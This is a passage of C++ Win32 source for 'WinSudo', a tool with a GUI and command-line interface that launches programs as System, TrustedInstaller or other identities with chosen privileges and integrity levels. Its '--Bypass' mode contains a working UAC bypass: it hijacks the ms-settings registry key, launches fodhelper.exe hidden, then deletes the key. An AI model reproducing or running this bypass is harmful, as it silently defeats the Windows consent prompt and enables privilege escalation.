            HFONT hFont = CreateFontA(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");

            // --- Layout Y coordinates ---
            int yUser = 10, yCmd = 65, yDir = 120, yDesk = 170, yGrp = 225, yPriv = 280, yOpt = 335, yLog = 385;
            
            // 1. User & Preset (Layout Modified)
            // Left: Preset
            HWND hLblPreset = CreateWindowA("STATIC", "预设 (Preset):", WS_CHILD | WS_VISIBLE, 20, yUser, 150, 20, hwnd, NULL, NULL, NULL);
            SendMessageA(hLblPreset, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            hComboPreset = CreateWindowA("COMBOBOX", NULL, WS_CHILD | WS_VISIBLE | WS_VSCROLL | CBS_DROPDOWNLIST, 20, yUser + 20, 210, 200, hwnd, (HMENU)ID_COMBO_PRESET, NULL, NULL);
            const char* presets[] = { 
                "Normal",
                "System", "System+", 
                "Admin", "Admin+", 
                "TrustedInstaller", "TrustedInstaller+", 
                "LOCAL SERVICE", "LOCAL SERVICE+", 
                "NETWORK SERVICE", "NETWORK SERVICE+", 
                "DWM", "DWM+" 
            };
            for (const char* p : presets) SendMessageA(hComboPreset, CB_ADDSTRING, 0, (LPARAM)p);
            SendMessageA(hComboPreset, WM_SETFONT, (WPARAM)hFont, TRUE);

            // Right: Identity
            HWND hLblUser = CreateWindowA("STATIC", "身份 (User/SID):", WS_CHILD | WS_VISIBLE, 250, yUser, 200, 20, hwnd, NULL, NULL, NULL); 
            SendMessageA(hLblUser, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            hComboUser = CreateWindowA("COMBOBOX", NULL, WS_CHILD | WS_VISIBLE | WS_VSCROLL | CBS_DROPDOWN, 250, yUser + 20, 210, 200, hwnd, (HMENU)ID_COMBO_USER, NULL, NULL);
            const char* users[] = { "System", "TrustedInstaller", "Administrator", "LOCAL SERVICE", "NETWORK SERVICE", "DWM" }; 
            for (const char* u : users) SendMessageA(hComboUser, CB_ADDSTRING, 0, (LPARAM)u);
            SendMessageA(hComboUser, WM_SETTEXT, 0, (LPARAM)g_identityStr); 
            SendMessageA(hComboUser, WM_SETFONT, (WPARAM)hFont, TRUE);

            // 2. Command
            HWND hLblCmd = CreateWindowA("STATIC", "运行命令 (Command):", WS_CHILD | WS_VISIBLE, 20, yCmd, 300, 20, hwnd, NULL, NULL, NULL); 
            SendMessageA(hLblCmd, WM_SETFONT, (WPARAM)hFont, TRUE);
            hEditCmd = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", g_runCommand, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 20, yCmd+20, 340, 25, hwnd, (HMENU)ID_EDIT_CMD, NULL, NULL); 
            SendMessageA(hEditCmd, WM_SETFONT, (WPARAM)hFont, TRUE);
            HWND hBtnFileBrowse = CreateWindowA("BUTTON", "选择文件", WS_CHILD | WS_VISIBLE, 380, yCmd + 20, 80, 25, hwnd, (HMENU)ID_BTN_CMD_BROWSE, NULL, NULL);
            SendMessageA(hBtnFileBrowse, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // 3. Directory
            HWND hLblDir = CreateWindowA("STATIC", "启动路径 (Directory):", WS_CHILD | WS_VISIBLE, 20, yCmd + 55, 300, 20, hwnd, NULL, NULL, NULL);
            SendMessageA(hLblDir, WM_SETFONT, (WPARAM)hFont, TRUE);
            char currDir[MAX_PATH]; GetCurrentDirectoryA(MAX_PATH, currDir);
            hEditDir = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", currDir, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 20, yCmd + 75, 340, 25, hwnd, (HMENU)ID_EDIT_DIR, NULL, NULL);
            SendMessageA(hEditDir, WM_SETFONT, (WPARAM)hFont, TRUE);
            HWND hBtnDirBrowse = CreateWindowA("BUTTON", "浏览...", WS_CHILD | WS_VISIBLE, 380, yCmd + 75, 80, 25, hwnd, (HMENU)ID_BTN_DIR_BROWSE, NULL, NULL);
            SendMessageA(hBtnDirBrowse, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // 4. Desktop & Integrity
            HWND hLblDesk = CreateWindowA("STATIC", "桌面 (Desktop):", WS_CHILD | WS_VISIBLE, 20, yDesk, 150, 20, hwnd, NULL, NULL, NULL); SendMessageA(hLblDesk, WM_SETFONT, (WPARAM)hFont, TRUE);
            hEditDesktop = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", g_desktop, WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 20, yDesk+20, 210, 25, hwnd, (HMENU)ID_EDIT_DESKTOP, NULL, NULL); SendMessageA(hEditDesktop, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            HWND hLblIL = CreateWindowA("STATIC", "完整性 (Integrity):", WS_CHILD | WS_VISIBLE, 250, yDesk, 150, 20, hwnd, NULL, NULL, NULL); SendMessageA(hLblIL, WM_SETFONT, (WPARAM)hFont, TRUE);
            hComboIL = CreateWindowA("COMBOBOX", NULL, WS_CHILD | WS_VISIBLE | CBS_DROPDOWNLIST, 250, yDesk + 20, 210, 200, hwnd, (HMENU)ID_COMBO_IL, NULL, NULL);
            const char* levels[] = { "System (S)", "High (H)", "Medium+ (M+)", "Medium (M)", "Low (L)", "Untrusted (U)" };
            for (const char* l : levels) SendMessageA(hComboIL, CB_ADDSTRING, 0, (LPARAM)l);
            switch(Integrity_Level) {
                case SECURITY_MANDATORY_HIGH_RID: SendMessageA(hComboIL, CB_SETCURSEL, 1, 0); break;
                case SECURITY_MANDATORY_MEDIUM_PLUS_RID: SendMessageA(hComboIL, CB_SETCURSEL, 2, 0); break;
                case SECURITY_MANDATORY_MEDIUM_RID: SendMessageA(hComboIL, CB_SETCURSEL, 3, 0); break;
                case SECURITY_MANDATORY_LOW_RID: SendMessageA(hComboIL, CB_SETCURSEL, 4, 0); break;
                case SECURITY_MANDATORY_UNTRUSTED_RID: SendMessageA(hComboIL, CB_SETCURSEL, 5, 0); break;
                default: SendMessageA(hComboIL, CB_SETCURSEL, 0, 0); break;
            }
            SendMessageA(hComboIL, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // 5. Groups
            HWND hLblGrp = CreateWindowA("STATIC", "用户组 (点击编辑):", WS_CHILD | WS_VISIBLE, 20, yGrp, 200, 20, hwnd, NULL, NULL, NULL); SendMessageA(hLblGrp, WM_SETFONT, (WPARAM)hFont, TRUE);
            hEditGroups = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_READONLY, 20, yGrp+20, 440, 25, hwnd, (HMENU)ID_EDIT_GROUPS, NULL, NULL); SendMessageA(hEditGroups, WM_SETFONT, (WPARAM)hFont, TRUE);
            OldEditProc = (WNDPROC)SetWindowLongPtr(hEditGroups, GWLP_WNDPROC, (LONG_PTR)SubclassGroupsProc);

            // 6. Privileges
            HWND hLblPriv = CreateWindowA("STATIC", "特权管理 (点击编辑):", WS_CHILD | WS_VISIBLE, 20, yPriv, 200, 20, hwnd, NULL, NULL, NULL); SendMessageA(hLblPriv, WM_SETFONT, (WPARAM)hFont, TRUE);
            hEditPrivs = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "Default (All Enabled)", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | ES_READONLY, 20, yPriv+20, 440, 25, hwnd, (HMENU)ID_EDIT_PRIVS, NULL, NULL); SendMessageA(hEditPrivs, WM_SETFONT, (WPARAM)hFont, TRUE);
            OldPrivEditProc = (WNDPROC)SetWindowLongPtr(hEditPrivs, GWLP_WNDPROC, (LONG_PTR)SubclassPrivsProc);
            
            // 7. Options
            HWND hLblMode = CreateWindowA("STATIC", "显示模式:", WS_CHILD | WS_VISIBLE, 20, yOpt, 80, 20, hwnd, NULL, NULL, NULL); SendMessageA(hLblMode, WM_SETFONT, (WPARAM)hFont, TRUE);
            hComboMode = CreateWindowA("COMBOBOX", NULL, WS_CHILD | WS_VISIBLE | CBS_DROPDOWNLIST, 20, yOpt+20, 100, 200, hwnd, (HMENU)ID_COMBO_MODE, NULL, NULL);
            const char* modes[] = { "Normal", "Hide", "Maximize", "Minimize" }; for (const char* m : modes) SendMessageA(hComboMode, CB_ADDSTRING, 0, (LPARAM)m);
            switch(g_WindowCreateMode) {
                case SW_SHOWMAXIMIZED: SendMessageA(hComboMode, CB_SETCURSEL, 2, 0); break;
                case SW_SHOWMINIMIZED: SendMessageA(hComboMode, CB_SETCURSEL, 3, 0); break;
                case SW_HIDE: SendMessageA(hComboMode, CB_SETCURSEL, 1, 0); break;
                default: SendMessageA(hComboMode, CB_SETCURSEL, 0, 0); break;
            }
            SendMessageA(hComboMode, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            hCheckUIAccess = CreateWindowA("BUTTON", "UI Access", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 140, yOpt+20, 90, 20, hwnd, (HMENU)ID_CHECK_UIACCESS, NULL, NULL); SendMessageA(hCheckUIAccess, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessageA(hCheckUIAccess, BM_SETCHECK, (WPARAM)g_bUIAccess, 0);
            
            hCheckDebug = CreateWindowA("BUTTON", "Debug Log", WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 240, yOpt+20, 90, 20, hwnd, (HMENU)ID_CHECK_DEBUG, NULL, NULL); SendMessageA(hCheckDebug, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessageA(hCheckDebug, BM_SETCHECK, (WPARAM)g_bDebug, 0);
            
            HWND hBtnRun = CreateWindowA("BUTTON", "运行 (Run)", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON, 340, yOpt+10, 120, 35, hwnd, (HMENU)ID_BTN_RUN, NULL, NULL); SendMessageA(hBtnRun, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // 8. Log
            HWND hLblLog = CreateWindowA("STATIC", "执行日志 (Log):", WS_CHILD | WS_VISIBLE, 20, yLog, 200, 20, hwnd, NULL, NULL, NULL); SendMessageA(hLblLog, WM_SETFONT, (WPARAM)hFont, TRUE);
            g_hLogEdit = CreateWindowExA(WS_EX_CLIENTEDGE, "RICHEDIT50W", "", WS_CHILD | WS_VISIBLE | WS_VSCROLL | WS_HSCROLL | ES_MULTILINE | ES_READONLY | ES_NOHIDESEL, 20, yLog+20, 440, 120, hwnd, (HMENU)ID_EDIT_LOG, NULL, NULL);
            SendMessageA(g_hLogEdit, WM_SETFONT, (WPARAM)CreateFontA(14, 0, 0, 0, FW_NORMAL, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, FF_MODERN, "Consolas"), TRUE);
            
            UpdateGuiSummaries(hEditGroups, hEditPrivs); // 初始化文本
            break;
        }
        case WM_COMMAND: {
            int id = LOWORD(wParam);
            int code = HIWORD(wParam);

            // [新增] 处理预设选择变更
            if (id == ID_COMBO_PRESET && code == CBN_SELCHANGE) {
                int idx = SendMessageA(hComboPreset, CB_GETCURSEL, 0, 0);
                char text[256];
                SendMessageA(hComboPreset, CB_GETLBTEXT, idx, (LPARAM)text);

                Preset p = ResolvePreset(text);

                if (p.identityStr) {
                    // 2. 更新身份
                    SetWindowTextA(hComboUser, p.identityStr);

                    // 3. 更新组 (覆盖模式)
                    extraGroups = p.extraGroups;
                    
                    // 4. 更新特权 (覆盖模式)
                    // 注意：预设会重置 DisabledPrivilege 为空，因为 Preset 只处理 Remove
                    DisabledPrivilege.clear(); 
                    RemovePrivilege = p.RemovePrivilege;

                    // 5. 刷新界面显示
                    UpdateGuiSummaries(hEditGroups, hEditPrivs);
                }
            }

            switch(id) {
                case ID_BTN_CANCEL: PostQuitMessage(0); break;
                case ID_BTN_RUN: {
                    char bufCmd[2048] = { 0 }; char bufUser[256] = { 0 }; char bufDesk[256] = { 0 }; char bufDir[MAX_PATH] = { 0 };
                    GetWindowTextA(hEditCmd, bufCmd, 2047); GetWindowTextA(hComboUser, bufUser, 255); GetWindowTextA(hEditDesktop, bufDesk, 255); GetWindowTextA(hEditDir, bufDir, MAX_PATH - 1);
                    if (*bufCmd == 0) { MessageBoxA(hwnd, "请输入命令", "错误", MB_OK | MB_ICONERROR); return 0; }
                    if (*bufUser == 0) strcpy(bufUser, "System");
        
                    int ilIdx = SendMessageA(hComboIL, CB_GETCURSEL, 0, 0);
                    DWORD dwIL = SECURITY_MANDATORY_SYSTEM_RID;
                    switch (ilIdx) {
                        case 1: dwIL = SECURITY_MANDATORY_HIGH_RID; break;
                        case 2: dwIL = SECURITY_MANDATORY_MEDIUM_PLUS_RID; break;
                        case 3: dwIL = SECURITY_MANDATORY_MEDIUM_RID; break;
                        case 4: dwIL = SECURITY_MANDATORY_LOW_RID; break;
                        case 5: dwIL = SECURITY_MANDATORY_UNTRUSTED_RID; break;
                    }
        
                    int modeIdx = SendMessageA(hComboMode, CB_GETCURSEL, 0, 0);
                    int nShow = SW_SHOWNORMAL;
                    switch (modeIdx) {
                        case 1: nShow = SW_HIDE; break;
                        case 2: nShow = SW_SHOWMAXIMIZED; break;
                        case 3: nShow = SW_SHOWMINIMIZED; break;
                    }
        
                    BOOL bUIAccess = (SendMessageA(hCheckUIAccess, BM_GETCHECK, 0, 0) == BST_CHECKED);
                    g_bDebug = (SendMessageA(hCheckDebug, BM_GETCHECK, 0, 0) == BST_CHECKED);
                    SendMessageA(g_hLogEdit, WM_SETTEXT, 0, (LPARAM)"");
                    Log(LOG_INFO, "=== 开始执行 ===");
        
                    ExecuteSudoOperation(bufCmd, bufUser, bufDesk, bufDir, nShow, dwIL, bUIAccess, extraGroups, DisabledPrivilege, RemovePrivilege, NULL);
        
                    Log(LOG_INFO, "=== 执行结束 ===");
                    break;
                }
                case ID_BTN_CMD_BROWSE: {
                    OPENFILENAMEA ofn = {};
                    char path[MAX_PATH] = "";
            
                    ofn.lStructSize = sizeof(ofn);
                    ofn.hwndOwner = hwnd;
                    ofn.lpstrFile = path;
                    ofn.nMaxFile = MAX_PATH;
                    ofn.lpstrFilter = "可执行文件 (*.exe)\0*.exe\0所有文件 (*.*)\0*.*\0";
                    ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST;
            
                    if (GetOpenFileNameA(&ofn)) {
                        SetWindowTextA(hEditCmd, path);
                    }
                    break;
                }
                case ID_BTN_DIR_BROWSE: {
                    CoInitialize(NULL);
                    IFileDialog* dlg = nullptr;
                    if (SUCCEEDED(CoCreateInstance(
                        CLSID_FileOpenDialog, NULL,
                        CLSCTX_INPROC_SERVER,
                        IID_PPV_ARGS(&dlg)))) {
            
                        DWORD opts;
                        dlg->GetOptions(&opts);
                        dlg->SetOptions(opts | FOS_PICKFOLDERS);
            
                        if (SUCCEEDED(dlg->Show(hwnd))) {
                            IShellItem* item;
                            if (SUCCEEDED(dlg->GetResult(&item))) {
                                PWSTR path;
                                if (SUCCEEDED(item->GetDisplayName(
                                    SIGDN_FILESYSPATH, &path))) {
            
                                    SetWindowTextW(hEditDir, path);
                                    CoTaskMemFree(path);
                                }
                                item->Release();
                            }
                        }
                        dlg->Release();
                    }
                    CoUninitialize();
                    break;
                }
            }
            break;
        }
        case WM_CLOSE: PostQuitMessage(0); break;
        default: return DefWindowProcA(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// ==========================================
// 主程序
// ==========================================

int main(int argc, char* argv[]) {
    // 帮助检测
    if (argc > 1) {
        if(strcmp(argv[1], "--help") == 0){ShowUsage_Detailed(argv[0]); return 0;}
        if(strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "/?") == 0){ShowUsage_Brief(argv[0]); return 0;}
    }

    LoadLibraryA("Msftedit.dll");

    bool bBypass = false, bIsAdmin = IsUserAnAdmin(), bCleanRegistry = false, bShowGUI = false, bNeedChangeDir = true;
    int argStart = argc;
    int ParentProcessId = 0;
    
    g_desktop = GetCurrentLpDesktop();

    // 参数解析
    int parseStart = 1;

    if (argc >= 4 && strcmp(argv[1], "-pid") == 0) {
        bNeedChangeDir = false;
        ParentProcessId = atoi(argv[2]);
        parseStart = 4;
        if (argc >= 6 && strcmp(argv[3], "-E") == 0) {
            SetCurrentDirectoryA(argv[4]);
            bCleanRegistry = true;
            parseStart = 6;
        }
    }

    for (int i = parseStart; i < argc; i++) {
        if (_stricmp(argv[i], "--debug") == 0) {
            g_bDebug = true;
        }
        else if (_stricmp(argv[i], "--UIAccess") == 0) {
            g_bUIAccess = true;
        }
        else if (_stricmp(argv[i], "-GUI") == 0) {
            bShowGUI = true;
        }
        else if (_stricmp(argv[i], "-B") == 0 || _stricmp(argv[i], "--Bypass") == 0) {
            bBypass = true;
        }
        else if (_strnicmp(argv[i], "-U:", 3) == 0) {
            if (strlen(argv[i]) <= 3) { Log(LOG_ERROR, "-U 需要指定身份"); return 1; }
            g_identityStr = argv[i] + 3;
        }
        else if (_strnicmp(argv[i], "-Use:", 5) == 0) {
            if (strlen(argv[i]) <= 5) { Log(LOG_ERROR, "-Use 需要指定预设名"); return 1; }
            Preset tmp = ResolvePreset(argv[i] + 5);
            if(tmp.identityStr == NULL) { Log(LOG_ERROR, "无法解析预设名"); return 1; }
            g_identityStr = tmp.identityStr;
            extraGroups = tmp.extraGroups;
            RemovePrivilege = tmp.RemovePrivilege;
        }
        else if (_strnicmp(argv[i], "-D:", 3) == 0) {
            if (strlen(argv[i]) <= 3) { Log(LOG_ERROR, "-P 需要指定桌面"); return 1; }
            g_desktop = argv[i] + 3;
        }
        else if (_strnicmp(argv[i], "-IL:", 4) == 0) {
            DWORD IL_id = ResolveILlevel(argv[i] + 4);
            if (IL_id == -1) { Log(LOG_WARN, "无法解析完整性级别: %s", argv[i] + 4); }
            Integrity_Level = IL_id;
        }
        else if (_strnicmp(argv[i], "-Disabled:", 10) == 0) {
            int PrivilegeId = ResolvePrivilegeId(argv[i] + 10);
            if (PrivilegeId == -1) { Log(LOG_WARN, "无法解析特权 ID: %s", argv[i] + 4); }
            DisabledPrivilege.push_back(PrivilegeId);
        }
        else if (_strnicmp(argv[i], "-Remove:", 8) == 0) {
            int PrivilegeId = ResolvePrivilegeId(argv[i] + 8);
            if (PrivilegeId == -1) { Log(LOG_WARN, "无法解析特权 ID: %s", argv[i] + 4); }
            RemovePrivilege.push_back(PrivilegeId);
        }
        else if (_strnicmp(argv[i], "-M:", 3) == 0) {
            if (strlen(argv[i]) <= 3) { Log(LOG_ERROR, "-M 需要打开的窗口模式"); return 1; }
            int CreateMode = ResolveWindowCreateMode(argv[i] + 3);
            if (CreateMode == -2) { Log(LOG_WARN, "无法解析打开的窗口模式: %s", argv[i] + 3); }
            g_WindowCreateMode = CreateMode;
        }
        else if (_strnicmp(argv[i], "-C:", 3) == 0) {
            if (strlen(argv[i]) <= 3) { Log(LOG_ERROR, "-C 需要路径"); return 1; }
            if (bNeedChangeDir) {
                if (!SetCurrentDirectoryA(argv[i] + 3)) {
                    DWORD errCode = GetLastError();
                    Log(LOG_WARN, "更改目录至：%s 失败, 错误码：%lu", argv[i] + 3, errCode);
                    Log_ErrorCode(LOG_WARN, errCode);
                }
            }
        }
        else if (_strnicmp(argv[i], "-G:", 3) == 0) {
            if (strlen(argv[i]) <= 3) { Log(LOG_ERROR, "-G 需要值"); return 1; }
            extraGroups.push_back(std::string(argv[i] + 3));
        }
        else if (argv[i][0] == '-') {
            Log(LOG_ERROR, "未知的参数: %s", argv[i]);
        }
        else {
            argStart = i;
            break;
        }
    }
    
    if (bIsAdmin) {
        // 清理注册表
        if (bCleanRegistry) {
            RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
            Log(LOG_DEBUG, "已清理 bypass 注册表项");
        }
        
        // 构建命令行
        if (argStart < argc) {
            g_runCommand = GetCommandLineA();
            BOOL InQuotes = 0, InEscape = 0;
            for (int i = 0; i < argStart; i++) {
                for (; *g_runCommand != ' ' || InQuotes; g_runCommand++) {
                    if (*g_runCommand == '\\') {
                        InEscape ^= 1;
                    }
                    else if (!InEscape && *g_runCommand == '\"') {
                        InQuotes ^= 1;
                    }
                    else {
                        InEscape = 0;
                    }
                }
                for (; isspace(*g_runCommand); g_runCommand++);
            }
        }
        
        // 如果指定了 -GUI 且当前是管理员，显示 GUI
        if (bShowGUI) {
            DWORD procList[2];
            DWORD dwProcCount = GetConsoleProcessList(procList, 2);
            
            if(dwProcCount > 1) {
                STARTUPINFOA si = { sizeof(si) };
                PROCESS_INFORMATION pi = { 0 };

                // 使用 DETACHED_PROCESS，新进程将没有控制台，是一个纯后台/GUI 进程
                BOOL bSuccess = CreateProcessA(
                    NULL, 
                    GetCommandLineA(), // 传递完全相同的参数
                    NULL, NULL, FALSE, 
                    DETACHED_PROCESS,  // <--- 关键：脱离控制台
                    NULL, NULL, 
                    &si, &pi
                );

                if (bSuccess) {
                    // 启动成功，关闭句柄，然后直接退出当前进程
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    return 0;
                }
            } else if (dwProcCount) FreeConsole();
            
            WNDCLASSEXA wc{};
            wc.cbSize = sizeof(WNDCLASSEXA);
            wc.lpfnWndProc = WndProc;
            wc.hInstance = GetModuleHandle(NULL);
            wc.hCursor = LoadCursor(NULL, IDC_ARROW);
            wc.hbrBackground = (HBRUSH)(COLOR_WINDOW);
            wc.lpszClassName = "WinSudoGuiClass";
    
            RegisterClassExA(&wc);
    
            int w = 500, h = 570; // 稍微增加高度以容纳新控件
    
            HWND hwnd = CreateWindowA("WinSudoGuiClass", "WinSudo GUI Launcher", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
                CW_USEDEFAULT, CW_USEDEFAULT, w, h, NULL, NULL, GetModuleHandle(NULL), NULL);
    
            ShowWindow(hwnd, SW_SHOW);
            UpdateWindow(hwnd);
    
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) > 0) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            return 0;
        }
    }
    
    if (g_WindowCreateMode == -1) {
        SetConsoleCtrlHandler(NULL, TRUE);
    }
    
    if (bIsAdmin) {
        // ==========================================
        // 管理员模式：执行核心逻辑
        // ==========================================
        if (ParentProcessId > 0) {
            FreeConsole();
            if (!AttachConsole(ParentProcessId)) {
                AllocConsole();
            }
        }

        PROCESS_INFORMATION pi = { 0 };

        // 调用封装好的核心逻辑
        BOOL success = ExecuteSudoOperation(
            g_runCommand,
            g_identityStr,
            g_desktop,
            "", // CLI模式下已在上方 SetCurrentDirectory 设置了 CWD，此处传空即可
            g_WindowCreateMode,
            Integrity_Level,
            g_bUIAccess,
            extraGroups,
            DisabledPrivilege,
            RemovePrivilege,
            &pi
        );

        if (success) {
            if (g_WindowCreateMode == -1) {
                WaitForSingleObject(pi.hProcess, INFINITE);
                DWORD exitCode = 0;
                GetExitCodeProcess(pi.hProcess, &exitCode);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                TerminateParent(ParentProcessId, exitCode);
                ExitProcess(exitCode);
            }
            else {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                TerminateParent(ParentProcessId, 0);
                ExitProcess(0);
            }
        }
        else {
            TerminateParent(ParentProcessId, 1);
            return 1;
        }

    }
    else if (bBypass) {
        // ==========================================
        // UAC Bypass 模式
        // ==========================================
        char CurrentDirectory[32768];
        GetCurrentDirectoryA(32768, CurrentDirectory);
        
        char selfPath[MAX_PATH];
        char cmdline[32768];

        GetModuleFileNameA(NULL, selfPath, MAX_PATH);

        if (bShowGUI)sprintf(cmdline, "\"%s\" -pid -1 -E %s %s", selfPath, CurrentDirectory, GetCommandLineA());
        else sprintf(cmdline, "\"%s\" -pid %lu -E %s %s", selfPath, GetCurrentProcessId(), CurrentDirectory, GetCommandLineA());

        RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

        HKEY hKey;
        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command",
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)cmdline, strlen(cmdline) + 1);
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
        RegCloseKey(hKey);

        Log(LOG_DEBUG, "Bypass 命令: %s", cmdline);

        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpFile = "fodhelper.exe";
        sei.nShow = SW_HIDE;

        Log(LOG_INFO, "UAC Bypass...");
        if (ShellExecuteExA(&sei)) {
            if (!bShowGUI)Sleep(INFINITE);
        }
        else {
            DWORD ErrCode = GetLastError();
            Log(LOG_ERROR, "Bypass 失败: %lu", ErrCode);
            Log_ErrorCode(LOG_ERROR, ErrCode);
            RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
            return 1;
        }
    }
    else {
        // ==========================================
        // 普通 UAC 提权
        // ==========================================
        char selfPath[MAX_PATH];
        char params[32768];

        GetModuleFileNameA(NULL, selfPath, MAX_PATH);

        // ★ 修复3：使用用户的提权逻辑
        if (bShowGUI)sprintf(params, "-pid -1 %s", GetCommandLineA());
        else sprintf(params, "-pid %lu %s", GetCurrentProcessId(), GetCommandLineA());

        Log(LOG_DEBUG, "提权参数: %s", params);

        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = selfPath;
        sei.lpParameters = params;
        sei.nShow = SW_SHOWNORMAL;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;

        Log(LOG_INFO, "请求管理员权限...");
        if (ShellExecuteExA(&sei)) {
            CloseHandle(sei.hProcess);
            if (!bShowGUI)Sleep(INFINITE);
        }
        else {
            DWORD ErrCode = GetLastError();
            Log(LOG_ERROR, "提权失败: %lu", ErrCode);
            Log_ErrorCode(LOG_ERROR, ErrCode);
            return 1;
        }
    }

    return 0;
}